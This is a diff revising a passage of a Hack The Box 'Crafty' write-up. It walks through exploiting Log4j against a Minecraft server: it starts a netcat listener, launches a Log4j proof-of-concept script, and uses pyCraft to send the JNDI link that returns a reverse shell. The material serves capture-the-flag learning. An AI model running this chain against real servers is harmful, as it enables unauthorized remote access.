@@ -112,10 +112,10 @@ rlwrap nc -lvnp 4444
 Then we start the log4j exploit. 
 
 ```
-python3 poc.py --userip 10.10.14.222 --webport 80 --lport 4444
+python3 poc.py --userip <IP_ADDRESS> --webport 80 --lport <PORT_NUMBER>
 ```
 
-![Log4j exploit launch](/images/HTB-Crafty/log4j-exploit-launch.png)
+![Log4j exploit launch](/images/HTB-Crafty/crafty-exploit.png)
 
 From the pyCraft folder we run `start.py`
 
@@ -125,9 +125,9 @@ pip install -r requirements.txt
 python3 start.py
 ```
 
-![PyCraft Link](/images/HTB-Crafty/pyCraft-link.png)
+![PyCraft](/images/HTB-Crafty/PyCraft-connection.png)
 
-After you see the `Connected.` message with pyCraft you have to copy the link provided on the `Send me:` line in `log4j-shell-poc`, paste it in pyCraft then press `Enter` and you will catch a shell on your listener.
+After you see the `Connected.` message in PyCraft. Copy the link provided on the line starting with `Send me:` in `log4j-shell-poc`, paste it in pyCraft then press `Enter` and you will catch a shell on your listener.
 
 ![svc_minecraft shell](/images/HTB-Crafty/shell-minecraft.png)
 
